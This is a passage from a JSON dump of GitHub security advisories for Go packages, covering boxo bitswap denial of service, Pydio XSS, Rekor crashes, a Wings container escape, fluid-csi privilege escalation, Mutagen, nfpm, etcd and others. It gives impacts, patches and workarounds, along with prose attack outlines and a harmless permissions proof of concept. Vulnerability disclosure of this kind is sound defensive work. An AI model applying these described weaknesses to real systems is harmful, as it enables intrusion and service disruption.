Update `boxo` to [`v0.4.1`](https://github.com/ipfs/boxo/releases/tag/v0.4.1)\n   Note that ***`v0.5.0` is NOT safe***, `v0.4.1` is a backport of the `v0.6.0` security fixes on top of `v0.4.0`.\n\n### Mitigations\n1. The server now limits how many wantlist entries per peer it knows.\n    The `MaxQueuedWantlistEntriesPerPeer` option allows configuring how many wantlist entries the server remembers; if a peer sends a wantlist bigger than this (including a sum of multiple delta updates) the server will truncate the wantlist to the match the limit.\n    This defaults to `1024` entries per peer.\n2. The server now properly clears state about peers when they disconnect.\n    Peer state is more lazily allocated (only when a wantlist is received in the first place) and is properly cleared when the `PeerDisconnected` callback is received.\n3. The server now ignores CIDs above some size.\n    Clients were able to send any CID as long as the total protobuf message were bellow the 4MiB limit. This is allowed to allocate lots of memory with very little entries.\n    This can be configured using the `MaxCidSize` option and defaults to `168 bytes`.\n4. The server now closes the connection if an inline CID is requested (either as `WANT_*` or `CANCEL`).\n    The attack were more effective if done with CIDs that are present in target's blockstore, this is because this will push longer-lasting jobs on some priority queue.\n    Since inline CID are literal data (instead of hashes of data), everyone always \"has\" any inline CID (since instead of loading the data from disk, it can be extracted from the CID). It makes no sense for anyone to ever ask you about an inline CID since they could also just parse it themselves. Thus, as a defensive measure, we kill the connection with peers that ask about an inline CID.\n\n### Vulnerable symbols\n- `github.com/ipfs/go-libipfs/bitswap/server/internal/decision.(*Engine).MessageReceived`\n- `github.com/ipfs/go-libipfs/bitswap/server/internal/decision.(*Engine).NotifyNewBlocks`\n- `github.com/ipfs/go-libipfs/bitswap/server/internal/decision.(*Engine).findOrCreate`\n- `github.com/ipfs/go-libipfs/bitswap/server/internal/decision.(*Engine).PeerConnected`\n\n### Patches\n- https://github.com/ipfs/boxo/commit/9cb5cb54d40b57084d1221ba83b9e6bb3fcc3197 (mitigations 1 and 2)\n- https://github.com/ipfs/boxo/commit/62cbac40b96f49e39cd7fedc77ee6b56adce4916 (mitigations 3 and 4)\n- https://github.com/ipfs/boxo/commit/baa748b682fabb21a4c1f7628a8af348d4645974 (tests)\n\n### Workarounds\nIf you are using the stubs at `github.com/ipfs/go-libipfs/bitswap` and not taking advantage of the features provided by the server, refactoring your code to use the new split API will allow you to run in a client-only mode using: [`github.com/ipfs/boxo/bitswap/client`](https://pkg.go.dev/github.com/ipfs/boxo/bitswap/client).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-libipfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.5.0"}, {"fixed": "0.6.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-libipfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/boxo/security/advisories/GHSA-m974-xj4j-7qv5"}, {"type": "WEB", "url": "https://github.com/ipfs/go-libipfs/security/advisories/GHSA-m974-xj4j-7qv5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25568"}, {"type": "WEB", "url": "https://github.com/ipfs/boxo/commit/62cbac40b96f49e39cd7fedc77ee6b56adce4916"}, {"type": "WEB", "url": "https://github.com/ipfs/boxo/commit/9cb5cb54d40b57084d1221ba83b9e6bb3fcc3197"}, {"type": "WEB", "url": "https://github.com/ipfs/boxo/commit/baa748b682fabb21a4c1f7628a8af348d4645974"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/boxo"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-05-11T20:32:18Z", "nvd_published_at": "2023-05-10T14:15:32Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wmfc-g86p-fjvr", "modified": "2023-11-15T18:10:04Z", "published": "2023-05-30T15:30:27Z", "aliases": ["CVE-2023-2981"], "summary": "go package pydio cells vulnerable to cross-site scripting ", "details": "A vulnerability, which was classified as problematic, has been found in Abstrium Pydio Cells 4.2.0. This issue affects some unknown processing of the component Chat. The manipulation leads to basic cross site scripting. The attack may be initiated remotely. Upgrading to version 4.2.1 is able to address this issue. It is recommended to upgrade the affected component. The identifier VDB-230213 was assigned to this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pydio/cells"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2981"}, {"type": "PACKAGE", "url": "https://github.com/pydio/cells"}, {"type": "WEB", "url": "https://popalltheshells.medium.com/multiple-cves-affecting-pydio-cells-4-2-0-321e7e4712be"}, {"type": "WEB", "url": "https://pydio.com/en/community/releases/pydio-cells/pydio-cells-enterprise-421"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.230213"}, {"type": "WEB", "url": "https://vuldb.com/?id.230213"}], "database_specific": {"cwe_ids": ["CWE-80"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-31T18:26:12Z", "nvd_published_at": "2023-05-30T15:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-frqx-jfcm-6jjr", "modified": "2023-05-26T19:39:03Z", "published": "2023-05-26T19:39:03Z", "aliases": ["CVE-2023-33199"], "summary": "malformed proposed intoto entries can cause a panic", "details": "### Impact\nA malformed proposed entry of the `intoto/v0.0.2` type can cause a panic on a thread within the Rekor process. The thread is recovered so the client receives a 500 error message and service still continues, so the availability impact of this is minimal.\n\n### Patches\nThis is fixed in v1.2.0 of Rekor.\n\n### Workarounds\nNo\n\n### References\nDiscovered by OSS-Fuzz", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sigstore/rekor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sigstore/rekor/security/advisories/GHSA-frqx-jfcm-6jjr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33199"}, {"type": "WEB", "url": "https://github.com/sigstore/rekor/commit/140c5add105179e5ffd9e3e114fd1b6b93aebbd4"}, {"type": "PACKAGE", "url": "https://github.com/sigstore/rekor"}], "database_specific": {"cwe_ids": ["CWE-617"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-26T19:39:03Z", "nvd_published_at": "2023-05-26T23:15:18Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p744-4q6p-hvc2", "modified": "2023-05-11T19:54:17Z", "published": "2023-05-11T19:54:17Z", "aliases": ["CVE-2023-32080"], "summary": "Wings vulnerable to escape to host from installation container", "details": "### Impact\n\nThis vulnerability impacts anyone running the affected versions of Wings.  This vulnerability can be used to gain access to the host system running Wings if a user is able to modify an server's install script or the install script executes code supplied by the user (either through environment variables, or commands that execute commands based off of user data).\n\n### Patches\n\nThis vulnerability has been resolved in version `v1.11.6` of Wings, and has been back-ported to the 1.7 release series in `v1.7.5`.\n\nAnyone running `v1.11.x` should upgrade to `v1.11.6` and anyone running `v1.7.x` should upgrade to `v1.7.5`.\n\n### Workarounds\n\nRunning Wings with a rootless container runtime may mitigate the severity of any attacks, however the majority of users are using container runtimes that run as root as per our documentation.\n\nSELinux may prevent attackers from performing certain operations against the host system, however privileged containers have a lot of freedom even on systems with SELinux enabled.\n\nTL;DR: None at this time.\n\n### Extra details\n\nIt should be noted that this was a known attack vector, for attackers to easily exploit this attack it would require compromising an administrator account on a Panel.  However, certain eggs (the data structure that holds the install scripts that get passed to Wings) have an issue where they are unknowingly executing shell commands with escalated privileges provided by untrusted user data.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pterodactyl/wings"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pterodactyl/wings"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pterodactyl/wings/security/advisories/GHSA-p744-4q6p-hvc2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32080"}, {"type": "PACKAGE", "url": "https://github.com/pterodactyl/wings"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/releases/tag/v1.11.6"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/releases/tag/v1.17.5"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/releases/tag/v1.7.5"}], "database_specific": {"cwe_ids": ["CWE-250"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-05-11T19:54:17Z", "nvd_published_at": "2023-05-10T21:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jv3f-7m33-qp65", "modified": "2023-06-01T14:51:36Z", "published": "2023-05-26T13:57:27Z", "aliases": ["CVE-2023-33955"], "summary": "Minio console object names with RIGHT-TO-LEFT OVERRIDE unicode character can be exploited", "details": "### Impact\nUnicode RIGHT-TO-LEFT OVERRIDE characters can be used to mask the original filename.\n\n### Reported-By\nThanks to the report from Mio Li [wulilixi1@gmail.com](mailto:wulilixi1@gmail.com)\n\n### Patches\n```\ncommit 17e791afb90c9ad27c65f63c6be14f2f6a3a9d60\nAuthor: Daniel Valdivia <18384552+dvaldivia@users.noreply.github.com>\nDate:   Tue May 23 08:47:12 2023 -0700\n\n    Replace RIGHT-TO-LEFT OVERRIDE unicode (#2828)\n    \n    Signed-off-by: Daniel Valdivia <18384552+dvaldivia@users.noreply.github.com>\n```\n\n### Workarounds\nWorkarounds are to remove the concerned file and rewrite it properly with the right file and extensions.  Avoid using RTLO characters in your filenames.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/minio/console"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.28.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/minio/console/security/advisories/GHSA-jv3f-7m33-qp65"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33955"}, {"type": "WEB", "url": "https://github.com/minio/console/commit/17e791afb90c9ad27c65f63c6be14f2f6a3a9d60"}, {"type": "PACKAGE", "url": "https://github.com/minio/console"}, {"type": "WEB", "url": "https://github.com/minio/console/releases/tag/v0.28.0"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-26T13:57:27Z", "nvd_published_at": "2023-05-30T07:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-93xx-cvmc-9w3v", "modified": "2023-05-09T19:58:47Z", "published": "2023-05-09T19:58:47Z", "aliases": ["CVE-2023-30840"], "summary": "On a compromised node, the fluid-csi service account can be used to modify node specs", "details": "### Impact\n\nIf a malicious user gains control of a Kubernetes node running fluid csi pod (controlled by the `csi-nodeplugin-fluid` node-daemonset), he/she can leverage the fluid-csi service account to modify specs of all the nodes in the cluster. However, since this service account lacks \"list node\" permissions, the attacker may need to use other techniques to identify vulnerable nodes.\n\nOnce the attacker identifies and modifies the node specs, he/she can manipulate system-level-privileged components to access all secrets in the cluster or execute pods on other nodes. This allows he/she to elevate privileges beyond the compromised node and potentially gain full privileged access to the whole cluster.\n\nTo exploit this vulnerability, the attacker can make all other nodes unschedulable (for example, patch node with taints) and wait for system-critical components with high privilege to appear on the compromised node. However, this attack requires two prerequisites: a compromised node and identifying all vulnerable nodes through other means. Additionally, since the attack is passive and requires patience and luck, the severity of this finding is considered medium.\n\n### Patches\nFor users who're using version < 0.8.6, >= 0.7.0, upgrade to v0.8.6.\n\n### Workarounds\nDelete the `csi-nodeplugin-fluid` daemonset in `fluid-system` namespace and avoid using CSI mode to mount FUSE file systems. Alternatively using sidecar mode to mount FUSE file systems is recommended. Refer to [the doc](https://github.com/fluid-cloudnative/fluid/blob/master/docs/en/samples/knative.md) to get a full example of how to use sidecar mode.\n\n### References\n\n\nFixed by [Fix rbacs and limit CSI Plugin's node related access](https://github.com/fluid-cloudnative/fluid/commit/77c8110a3d1ec077ae2bce6bd88d296505db1550)\n\n### Credits\nSpecial thanks to the discoverers of this issue:\n\nNanzi Yang ([nzyang@stu.xidian.edu.cn](mailto:nzyang@stu.xidian.edu.cn))\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fluid-cloudnative/fluid"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.7.0"}, {"fixed": "0.8.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fluid-cloudnative/fluid/security/advisories/GHSA-93xx-cvmc-9w3v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30840"}, {"type": "WEB", "url": "https://github.com/fluid-cloudnative/fluid/commit/77c8110a3d1ec077ae2bce6bd88d296505db1550"}, {"type": "WEB", "url": "https://github.com/fluid-cloudnative/fluid/commit/91c05c32db131997b5ca065e869c9918a125c149"}, {"type": "PACKAGE", "url": "https://github.com/fluid-cloudnative/fluid"}, {"type": "WEB", "url": "https://github.com/fluid-cloudnative/fluid/releases/tag/v0.8.6"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-09T19:58:47Z", "nvd_published_at": "2023-05-08T18:15:14Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jmp2-wc4p-wfh2", "modified": "2023-05-05T02:25:00Z", "published": "2023-05-05T02:25:00Z", "aliases": ["CVE-2023-30844"], "summary": "Mutagen list and monitor operations do not neutralize control characters in text controlled by remote endpoints", "details": "### Impact\n\nMutagen command line operations, as well as the log output from `mutagen daemon run`, are susceptible to control characters that could be provided by remote endpoints.  This can cause terminal corruption, either intentional or unintentional, if these characters are present in error messages, file paths/names, and/or log output.  This could be used as an attack vector if synchronizing with an untrusted remote endpoint, synchronizing files not under control of the user, or forwarding to/from an untrusted remote endpoint.  On very old systems with terminals susceptible to issues such as [CVE-2003-0069](https://nvd.nist.gov/vuln/detail/CVE-2003-0069), the issue could theoretically cause code execution.\n\n\n### Patches\n\nThe problem has been patched in Mutagen v0.16.6 and v0.17.1.  Earlier versions of Mutagen are no longer supported and will not be patched.  Versions of Mutagen after v0.18.0 will also have the patch merged.\n\nOne caveat is that the templating functionality of Mutagen's `list` and `monitor` commands has been only partially patched.  In particular, the `json` template function already provided escaping and no patching was necessary.  However, raw template output has been left unescaped because this raw output may be necessary for commands which embed Mutagen.  To aid these commands, a new `shellSanitize` template function has been added which provides control character neutralization in strings.\n\n\n### Workarounds\n\nAvoiding synchronization of untrusted files or interaction with untrusted remote endpoints should mitigate any risk.\n\n\n### References\n\nA similar issue can be seen in kubernetes/kubernetes#101695.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mutagen-io/mutagen"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mutagen-io/mutagen-compose"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mutagen-io/mutagen"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.17.0"}, {"fixed": "0.17.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/mutagen-io/mutagen/security/advisories/GHSA-jmp2-wc4p-wfh2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30844"}, {"type": "PACKAGE", "url": "https://github.com/mutagen-io/mutagen"}, {"type": "WEB", "url": "https://github.com/mutagen-io/mutagen/releases/tag/v0.16.6"}, {"type": "WEB", "url": "https://github.com/mutagen-io/mutagen/releases/tag/v0.17.1"}], "database_specific": {"cwe_ids": ["CWE-116", "CWE-150"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-05-05T02:25:00Z", "nvd_published_at": "2023-05-08T18:15:14Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fwj4-72fm-c93g", "modified": "2023-05-05T02:18:26Z", "published": "2023-05-05T02:18:26Z", "aliases": [], "summary": "Under-validated ComSpec and cmd.exe resolution in Mutagen projects", "details": "### Impact\n\nMutagen projects offer shell-based execution functionality.  On Windows, the shell is resolved using the standard `%ComSpec%` mechanism, with a fallback to a `%PATH%`-based search for `cmd.exe`.  While this is the standard practice on Windows systems, it presents somewhat risky behavior.\n\nFirstly, `%ComSpec%` could, in theory, be set maliciously.  Unfortunately, there's not much that can be done to prevent this attack surface, because `%ComSpec%` is the official mechanism for shell specification on Windows.  We can, however, validate that it points to an absolute path, which one would expect for a properly set value.\n\nSecondly, a fallback to a relative `cmd.exe` path, resolved via `%PATH%`, could be risky.  The risk is largely mitigated by changes in Go 1.19 and later, but prior to that a malicious `cmd.exe` could been resolved in the current working directory.  To mitigate this issue, Mutagen now uses the `%SystemRoot%` environment variable (also validated to be an absolute path) to resolve `cmd.exe` in the event that `%ComSpec%` is not set correctly.\n\n\n### Patches\n\nThe problem has been patched in Mutagen v0.16.6 and v0.17.1. Earlier versions of Mutagen are no longer supported and will not be patched. Versions of Mutagen after v0.18.0 will also have the patch merged.\n\n\n### Workarounds\n\nMaintain control of the environment variable settings on your system, in particular the `ComSpec` environment variable.\n\n### References\n\nMore information on `%ComSpec%` can be found [online](https://en.wikipedia.org/wiki/COMSPEC).\n\nMore information on Go's `PATH`-based lookup changes can be found [here](https://go.dev/blog/path-security), [here](https://go.dev/doc/go1.19#os-exec-path), and [here](https://github.com/golang/go/issues/43947).\n\nA [similar issue](https://github.com/python/cpython/issues/101283) that was addressed within the Python subprocess module also provides additional discussion.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mutagen-io/mutagen"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mutagen-io/mutagen"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.17.0"}, {"fixed": "0.17.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/mutagen-io/mutagen/security/advisories/GHSA-fwj4-72fm-c93g"}, {"type": "PACKAGE", "url": "https://github.com/mutagen-io/mutagen"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-05-05T02:18:26Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-w7jw-q4fg-qc4c", "modified": "2023-05-24T17:30:16Z", "published": "2023-05-24T17:30:16Z", "aliases": ["CVE-2023-32698"], "summary": "nfpm has incorrect default permissions", "details": "### Summary\nWhen building packages directly from source control, file permissions on the checked-in files are not maintained. \n\n### Details\nWhen building packages directly from source control, file permissions on the checked-in files are not maintained. When nfpm packaged the files (without extra config for enforcing its own permissions) files could go out with bad permissions (chmod 666 or 777).\n\n### PoC\nCreate a default nfpm structure. \n\nWithin the test folder, create 3 files named `chmod-XXX.sh`. Each script has file \npermissions set corresponding with their file names (`chmod-777.sh` = `chmod 777`). Below each \nfile and permissions can be seen.\n\n```console\n$ ls -lart test \ntotal 24\n-rwxrwxrwx   1 user  group   11 May 19 13:15 chmod-777.sh\n-rw-rw-rw-   1 user  group   11 May 19 13:16 chmod-666.sh\ndrwxr-xr-x   5 user  group  160 May 19 13:19 .\n-rw-rw-r--   1 user  group   11 May 19 13:19 chmod-664.sh\ndrwxr-xr-x  10 user  group  320 May 19 13:29 ..\n```\n\nBelow is the snippet nfpm configuration file of the contents of the package. The test folder \nand files has no extra config for enforcing permissions. \n\n```yaml\ncontents:\n- src: foo-binary\n  dst: /usr/bin/bar\n- src: bar-config.conf\n  dst: /etc/foo-binary/bar-config.conf\n  type: config\n- src: test\n  dst: /etc/test/scripts\n```\n\nThe next step is to create a deb package.\n\n```console\n$ nfpm package -p deb # Create dep package\nusing deb packager...\ncreated package: foo_1.0.0_arm64.deb\n```\n\nWhen on a Ubuntu VM, install the foo package which was created\n\n```console\n$ sudo dpkg -i foo_1.0.0_arm64.deb # Installing deb package within Ubuntu\nSelecting previously unselected package foo.\n(Reading database ... 67540 files and directories currently installed.)\nPreparing to unpack foo_1.0.0_arm64.deb ...\nUnpacking foo (1.0.0) ...\nSetting up foo (1.0.0) ...\n```\n\nLooking at `/etc/test/scripts` and viewing the permissions. Permissions are passed exactly the same as the source.\n\n```console\n$ ls -lart /etc/test/scripts\ntotal 20\n-rwxrwxrwx 1 root root   11 May 22 12:15 chmod-777.sh\n-rw-rw-rw- 1 root root   11 May 22 12:16 chmod-666.sh\n-rw-rw-r-- 1 root root   11 May 22 12:19 chmod-664.sh\ndrwxr-xr-x 3 root root 4096 May 22 13:00 ..\ndrwxr-xr-x 2 root root 4096 May 22 13:00 .\n```\n\n\n## Solution\nTo prevent world-writable files from making it into the packages, add the ability to override the default permissions of packaged files using a umask config option in the packaging spec file. This feature in nfpm would allow applying a global umask across any files being packaged, therefore, with the correct configuration, preventing world-writable files without needing to list permissions on each and every file in the package\n\n\n### Impact\n\nVulnerability is https://cwe.mitre.org/data/definitions/276.html\nhttps://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\n\nAnyone using nfpm for creating packages and not checking/setting file permissions before packaging could result in bad permissions for files/folders.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goreleaser/nfpm/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.29.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goreleaser/nfpm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"fixed": "2.29.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goreleaser/nfpm/security/advisories/GHSA-w7jw-q4fg-qc4c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32698"}, {"type": "WEB", "url": "https://github.com/goreleaser/nfpm/commit/ed9abdf63d5012cc884f2a83b4ab2b42b3680d30"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-w7jw-q4fg-qc4c"}, {"type": "PACKAGE", "url": "https://github.com/goreleaser/nfpm"}, {"type": "WEB", "url": "https://github.com/goreleaser/nfpm/releases/tag/v2.29.0"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-05-24T17:30:16Z", "nvd_published_at": "2023-05-30T04:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qmqw-r4x6-3w2q", "modified": "2023-05-12T15:24:21Z", "published": "2023-05-09T06:30:25Z", "aliases": ["CVE-2023-2590"], "summary": "Answer Missing Authorization vulnerability", "details": "A missing authorization in GitHub repository answerdev/answer prior to 1.0.9 can lead to a user rating their own answer as the best answer.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2590"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/51ac1e6b76ae9ab3ca2008ca4819c0cc3bd2fcd3"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/a4238a30-3ddb-4415-9055-e179c3d4dea7"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-05-11T20:36:13Z", "nvd_published_at": "2023-05-09T06:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3p4g-rcw5-8298", "modified": "2023-05-12T20:19:50Z", "published": "2023-05-12T20:19:50Z", "aliases": ["CVE-2023-32082"], "summary": "etcd Key name can be accessed via LeaseTimeToLive API", "details": "### Impact\nLeaseTimeToLive API allows access to key names (not value) associated to a lease when `Keys` parameter is true, even a user doesn't have read permission to the keys. The impact is limited to a cluster which enables auth (RBAC).\n\n### Patches\n< v3.4.26 and < v3.5.9 are affected.\n\n### Workarounds\nNo.\n\n### Reporter\nYoni Rozenshein", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/etcd-io/etcd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.4.26"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/etcd-io/etcd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.5.0"}, {"fixed": "3.5.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/etcd-io/etcd/security/advisories/GHSA-3p4g-rcw5-8298"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32082"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/pull/15656"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/blob/main/CHANGELOG/CHANGELOG-3.4.md"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/blob/main/CHANGELOG/CHANGELOG-3.5.md"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-05-12T20:19:50Z", "nvd_published_at": "2023-05-11T20:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g47h-fgcw-g4ph", "modified": "2023-06-07T16:00:36Z", "published": "2023-05-31T06:30:39Z", "aliases": ["CVE-2023-26131"], "summary": "Algernon engine and themes vulnerable to Cross-site Scripting", "details": "All versions of the package github.com/xyproto/algernon/engine; all versions of the package github.com/xyproto/algernon/themes are vulnerable to Cross-site Scripting (XSS) via the `themes.NoPage(filename, theme)` function due to improper user input sanitization. Exploiting this vulnerability is possible when a file/resource is not found.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/xyproto/algernon"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.15.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26131"}, {"type": "PACKAGE", "url": "https://github.com/xyproto/algernon"}, {"type": "WEB", "url": "https://github.com/xyproto/algernon/blob/aab484608651852d02a8a93f40baf53ed93e639a/engine/handlers.go#L512"}, {"type": "WEB", "url": "https://github.com/xyproto/algernon/blob/aab484608651852d02a8a93f40baf53ed93e639a/engine/handlers.go#L514"}, {"type": "WEB", "url": "https://github.com/xyproto/algernon/blob/aab484608651852d02a8a93f40baf53ed93e639a/themes/html.go#L145"}, {"type": "WEB", "url": "https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMXYPROTOALGERNONENGINE-3312111"}, {"type": "WEB", "url": "https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMXYPROTOALGERNONTHEMES-3312112"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-06T01:56:53Z", "nvd_published_at": "2023-05-31T05:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2h5h-59f5-c5x9", "modified": "2023-05-09T16:40:11Z", "published": "2023-05-03T21:56:23Z", "aliases": ["CVE-2023-30551"], "summary": "Rekor's compressed archives can result in OOM conditions", "details": "## Summary\nTwo vulnerabilities have been found in Rekor types for archive files JARs and APKs, where Rekor would crash due to out of memory conditions caused by reading archive metadata files into memory without checking their sizes first causing a Denial of Service of Rekor.\n\nThese vulnerabilities were found through fuzzing with [OSS-Fuzz](https://google.github.io/oss-fuzz/).\n\n## Vulnerability 1: OOM due to large files in META-INF directory of JAR files.\n### Summary\nVerification of a JAR file submitted to Rekor can cause an out of memory crash if files within the META-INF directory of the JAR are sufficiently large.\n\n### Details\nAs part of verifying a JAR file, Rekor uses the [relic library](http://github.com/sassoftware/relic) to check that the JAR is signed, the signature verifies, and that the hashes in the signed manifest are all valid. This library function reads files within META-INF/ into memory without checking their sizes, resulting in an OOM if the uncompressed file is sufficiently large. Rekor is also not performing any such checks prior to passing the JAR to this library function.\n\n### Patches\nUsers should update to the latest version of Rekor, 1.1.1.\n\n### 